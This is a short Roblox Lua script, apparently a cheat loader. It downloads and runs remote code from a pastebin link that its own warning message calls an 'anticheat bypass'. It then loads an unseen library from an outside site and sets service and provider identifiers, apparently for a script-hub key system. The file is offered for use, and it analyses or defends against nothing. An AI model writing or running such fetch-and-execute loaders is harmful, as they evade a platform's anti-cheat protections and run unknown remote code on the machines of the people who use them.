task.spawn(function()
    local success, err = pcall(function()
	        loadstring(game:HttpGet("https://pastebin.com/raw/NTep1zQE"))()
			    end)
				    if not success then
					        warn("error anticheat bypass", err)
							    end
end)
		
local Junkie = loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))()
Junkie.service = "ghhhhg"
Junkie.identifier = "141"
Junkie.provider = "Lootab"
